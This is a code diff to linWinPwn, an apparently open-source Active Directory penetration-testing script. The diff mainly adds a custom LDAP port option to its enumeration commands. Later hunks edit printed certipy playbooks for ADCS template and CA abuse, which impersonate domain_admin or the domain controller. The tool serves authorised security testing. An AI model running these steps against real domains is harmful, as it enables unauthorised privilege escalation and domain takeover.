@@ -25,6 +25,7 @@ attacker_interface="eth0"
 attacker_IP=$(ip -f inet addr show $attacker_interface | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
 curr_targets="Domain Controllers"
 targets="DC"
+ldap_port="389"
 custom_target_scanned=false
 nullsess_bool=false
 pass_bool=false
@@ -144,7 +145,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.32 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.33 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -167,6 +168,7 @@ help_linWinPwn() {
     echo -e "--auto              Run automatic enumeration"
     echo -e "-o/--output         Output directory (default: current dir)"
     echo -e "--auto-config       Run NTP sync with target DC and adds entry to /etc/hosts"
+    echo -e "--ldap-port         Use custom LDAP port (default port 389). Will apply to: netexec, ldapdomaindump, ldeep, windapsearch, godap, pre2k, ldapnomnom"
     echo -e "--ldaps             Use LDAPS instead of LDAP (port 636)"
     echo -e "--ldap-binding      Use LDAP Channel Binding on LDAPS (port 636)"
     echo -e "--force-kerb        Use Kerberos authentication instead of NTLM when possible (requires password or NTLM hash)"
@@ -260,12 +262,18 @@ while test $# -gt 0; do
         autoconfig_bool=true
         args+=("$1")
         ;;
+    --ldap-port)
+        ldap_port="${2}"
+        shift
+        ;;
     --ldaps)
         ldaps_bool=true
+        ldap_port="636"
         args+=("$1")
         ;;
     --ldap-binding)
         ldaps_bool=true
+        ldap_port="636"
         ldapbinding_bool=true
         args+=("$1")
         ;;
@@ -396,7 +404,8 @@ prepare() {
         echo -e "${RED}[-] Please ensure netexec is installed and try again... ${NC}"
         exit 1
     else
-        dc_info=$(${netexec} ldap "${dc_ip}" | grep -v "Connection refused")
+        dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "Connection refused")
+        #dc_info=$(${netexec} smb "${dc_ip}" | grep -v "Connection refused")
     fi
 
     dc_NETBIOS=$(echo "$dc_info" | sed -E 's/.*\((name:)([^)]+)\).*/\2/' | head -n 1)
@@ -961,7 +970,7 @@ bhd_enum() {
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbinding_param}"; else ldaps_param=""; fi
                 run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN} ${ldaps_param}" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt"
                 cd "${current_dir}" || exit
-                #run_command "${netexec} ${ne_verbose} ldap ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
+                #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c All --log ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt"
                 /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt"
                 /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_bhd_${dc_domain}.txt"
@@ -991,7 +1000,7 @@ bhd_enum_dconly() {
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps ${ldapbinding_param}"; else ldaps_param=""; fi
                 run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp -dc ${dc_FQDN} ${ldaps_param}" | tee "${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt"
                 cd "${current_dir}" || exit
-                #run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c DCOnly --log tee ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
+                #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --bloodhound --dns-server ${dc_ip} -c DCOnly --log tee ${output_dir}/DomainRecon/BloodHound/ne_bloodhound_output_${dc_domain}.txt" 2>&1
                 /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_bhd_${dc_domain}.txt"
                 /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/BloodHound/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_bhd_${dc_domain}.txt"
                 parse_users
@@ -1069,7 +1078,7 @@ ldapdomaindump_enum() {
             else
                 if [ "${ldapbinding_bool}" == true ]; then ldapbinding_param="--ldap-channel-binding"; else ldapbinding_param=""; fi
                 if [ "${ldaps_bool}" == true ]; then ldaps_param="${ldapbinding_param} ldaps"; else ldaps_param="ldap"; fi
-                run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip} -o ${output_dir}/DomainRecon/LDAPDomainDump" | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
+                run_command "${ldapdomaindump} ${argument_ldd} ${ldaps_param}://${dc_ip}:${ldap_port} -o ${output_dir}/DomainRecon/LDAPDomainDump" | tee "${output_dir}/DomainRecon/LDAPDomainDump/ldd_output_${dc_domain}.txt"
             fi
             /usr/bin/jq -r ".[].attributes.sAMAccountName[]" "${output_dir}/DomainRecon/LDAPDomainDump/domain_users.json" 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_ldd_${dc_domain}.txt"
             /usr/bin/jq -r ".[].attributes.dNSHostName[]" "${output_dir}/DomainRecon/LDAPDomainDump/domain_computers.json" 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_ldd_${dc_domain}.txt"
@@ -1132,45 +1141,44 @@ ne_smb_enum() {
 }
 
 ne_ldap_enum() {
-    if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${BLUE}[*] Users Enumeration (LDAP Null session)${NC}"
-        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
-        run_command "${netexec} ${ne_verbose} ldap ${target} -u Guest -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
-        run_command "${netexec} ${ne_verbose} ldap ${target} -u ${rand_user} -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} -u Guest -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} -u ${rand_user} -p '' ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>&1
         grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" 2>&1
     else
         echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
-        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
         grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" 2>&1
     fi
     parse_users
     echo -e ""
     echo -e "${BLUE}[*] DC List Enumeration${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --dc-list --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} --dc-list --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>&1
     grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>/dev/null | grep LDAP | awk '{print $12}' >"${output_dir}/DomainRecon/Servers/dc_list_ne_ldap_${dc_domain}.txt" 2>&1
     grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_dclist_output_${dc_domain}.txt" 2>/dev/null | grep LDAP | awk '{print $14}' >"${output_dir}/DomainRecon/Servers/dc_ip_list_ne_ldap_${dc_domain}.txt" 2>&1
     parse_servers
     echo -e ""
     echo -e ""
     echo -e "${BLUE}[*] Password not required Enumeration${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} --password-not-required --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_passnotrequired_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} --password-not-required --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_passnotrequired_output_${dc_domain}.txt" 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}" >"${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt"
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} -M get-desc-users --kdcHost ${dc_FQDN}" >"${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt"
     grep -i "pass\|pwd" "${output_dir}/DomainRecon/ne_get-desc-users_pass_output_${dc_domain}.txt" 2>/dev/null | tee "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" 2>&1
     if [ ! -s "${output_dir}/DomainRecon/ne_get-desc-users_pass_results_${dc_domain}.txt" ]; then
         echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
     fi
     echo -e ""
     echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M maq --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_MachineAccountQuota_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} -M maq --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_MachineAccountQuota_output_${dc_domain}.txt" 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Subnets Enumeration${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M subnets --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_subnets_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} -M subnets --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_subnets_output_${dc_domain}.txt" 2>&1
     echo -e ""
     echo -e "${BLUE}[*] LDAP-signing check${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} -M ldap-checker --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_ldap-checker_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} ${ldaps_param} -M ldap-checker --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_ldap-checker_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -1185,12 +1193,10 @@ deleg_enum() {
         fi
     fi
     echo -e "${BLUE}[*] findDelegation check (netexec)${NC}"
-    if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
-    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} --find-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_find-delegation_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} ${ldaps_param} --find-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_find-delegation_output_${dc_domain}.txt" 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Trusted-for-delegation check (netexec)${NC}"
-    if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
-    run_command "${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} ${ldaps_param} --trusted-for-delegation --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_trusted-for-delegation_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -1312,7 +1318,7 @@ ldeep_enum() {
                 echo -e "${PURPLE}[-] ldeep does not support Kerberos authentication using AES Key${NC}"
             else
                 if [ "${ldaps_bool}" == true ] || [ "${cert_bool}" == true ]; then ldaps_param="-s ldaps://"; else ldaps_param="-s ldap://"; fi
-                run_command "${ldeep} ldap ${argument_ldeep} ${ldaps_param}${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}" 2>&1 | tee "${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt"
+                run_command "${ldeep} ldap ${argument_ldeep} ${ldaps_param}${target}:${ldap_port} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}" 2>&1 | tee "${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt"
                 /bin/cp "${output_dir}/DomainRecon/ldeepDump/${dc_domain}_users_all.lst" "${output_dir}/DomainRecon/Users/users_list_ldp_${dc_domain}.txt" 2>/dev/null
                 /bin/cp "${output_dir}/DomainRecon/ldeepDump/${dc_domain}_computers.lst" "${output_dir}/DomainRecon/Servers/servers_list_ldp_${dc_domain}.txt" 2>/dev/null
                 parse_users
@@ -1333,13 +1339,13 @@ windapsearch_enum() {
             echo -e "${PURPLE}[-] windapsearch does not support Kerberos authentication${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_groups_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_privusers_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=*))'" >"${output_dir}/DomainRecon/windapsearch/windapsearch_spn_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(objectCategory=user)(objectClass=user)(distinguishedName=%managedBy%)'" >"${output_dir}/DomainRecon/windapsearch/windapsearch_managedby_${dc_domain}.txt"
-            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u" >"${output_dir}/DomainRecon/Servers/sql_list_windap_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m users --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m computers --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m groups --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_groups_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m privileged-users --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_privusers_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=*))'" >"${output_dir}/DomainRecon/windapsearch/windapsearch_spn_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(objectCategory=user)(objectClass=user)(distinguishedName=%managedBy%)'" >"${output_dir}/DomainRecon/windapsearch/windapsearch_managedby_${dc_domain}.txt"
+            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} --port ${ldap_port} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u" >"${output_dir}/DomainRecon/Servers/sql_list_windap_${dc_domain}.txt"
             #Parsing user and computer lists
             grep -a "sAMAccountName:" "${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt" | sed "s/sAMAccountName: //g" | sort -u >"${output_dir}/DomainRecon/Users/users_list_windap_${dc_domain}.txt" 2>&1
             grep -a "dNSHostName:" "${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt" | sed "s/dNSHostName: //g" | sort -u >"${output_dir}/DomainRecon/Servers/servers_list_windap_${dc_domain}.txt" 2>&1
@@ -1385,7 +1391,7 @@ rdwatool_enum() {
 
 ne_sccm() {
     echo -e "${BLUE}[*] SCCM Enumeration using netexec${NC}"
-    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap ${target_dc} ${argument_ne} -M sccm -o REC_RESOLVE=TRUE --log ${output_dir}/DomainRecon/ne_sccm_output_${dc_domain}.txt" 2>&1
+    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target_dc} ${argument_ne} -M sccm -o REC_RESOLVE=TRUE --log ${output_dir}/DomainRecon/ne_sccm_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -1593,7 +1599,7 @@ godap_console() {
         else
             echo -e "${BLUE}[*] Launching godap${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-S -I"; else ldaps_param=""; fi
-            run_command "${godap} ${target} ${argument_godap} --kdc ${dc_FQDN} ${ldaps_param}" 2>&1 | tee -a "${output_dir}/DomainRecon/godap_output_${dc_domain}.txt"
+            run_command "${godap} ${target} ${argument_godap} --port ${ldap_port} --kdc ${dc_FQDN} ${ldaps_param}" 2>&1 | tee -a "${output_dir}/DomainRecon/godap_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -1683,8 +1689,8 @@ ne_adcs_enum() {
     mkdir -p "${output_dir}/ADCS"
     if [ ! -f "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" ]; then
         echo -e "${BLUE}[*] ADCS Enumeration${NC}"
-        if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
-        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
+        if [ "${ldaps_bool}" == true ]; then ldaps_param="--port ${ldap_port}"; else ldaps_param=""; fi
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
     else
         echo -e "${YELLOW}[i] ADCS info found, skipping...${NC}"
     fi
@@ -1743,7 +1749,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
             echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip}"
+            echo -e "${certipy} auth -pfx domain_admin_dc.pfx -dc-ip ${dc_ip} -sid < ${sid_domain}-500 >"
         done
     fi
 
@@ -1753,9 +1759,9 @@ adcs_vuln_parse() {
         for vulntemp in $esc2_3_vuln; do
             echo -e "${YELLOW}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the domain_admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\domain_admin -pfx '${user}.pfx' -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template User -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\domain_admin -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}3. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1769,7 +1775,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip}"
             echo -e "${CYAN}2. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca < ${pki_cas//SPACE/ } > -target < ${pki_servers} > -template ${vulntemp} -upn domain_admin@${dc_domain} -dns ${dc_FQDN} -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json"
             echo -e "${CYAN}4. Authenticate using pfx of domain_admin or DC:${NC}"
@@ -1783,7 +1789,7 @@ adcs_vuln_parse() {
         for vulnca in $esc6_vuln; do
             echo -e "${YELLOW}# ${vulnca} certificate authority${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (domain_admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template User -upn domain_admin@${dc_domain} -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}2. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1799,11 +1805,11 @@ adcs_vuln_parse() {
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
             echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -enable-template SubCA -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -template SubCA -upn domain_admin@${dc_domain} -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
             echo -e "${certipy} ca ${argument_certipy} -ca $vulnca -issue-request <request_ID> -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip}"
+            echo -e "${certipy} req ${argument_certipy} -ca $vulnca -target < ${pki_servers} > -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}6. Authenticate using pfx of domain_admin:${NC}"
             echo -e "${certipy} auth -pfx domain_admin.pfx -dc-ip ${dc_ip}"
         done
@@ -1833,7 +1839,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}2. Change userPrincipalName of second_user to domain_admin:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template ${vulntemp} -dc-ip ${dc_ip}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target < ${pki_servers} > -ca < ${pki_cas//SPACE/ } > -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Authenticate using pfx of domain_admin:${NC}"
@@ -1852,7 +1858,7 @@ adcs_vuln_parse() {
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn domain_admin@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulnca -template User -dc-ip ${dc_ip}"
+            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca $vulnca -template User -dc-ip ${dc_ip} -key-size 4096"
             echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip}"
             echo -e "${CYAN}5. Authenticate using pfx of domain_admin or DC:${NC}"
@@ -1892,13 +1898,13 @@ certifried_check() {
                 i=$((i + 1))
                 pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
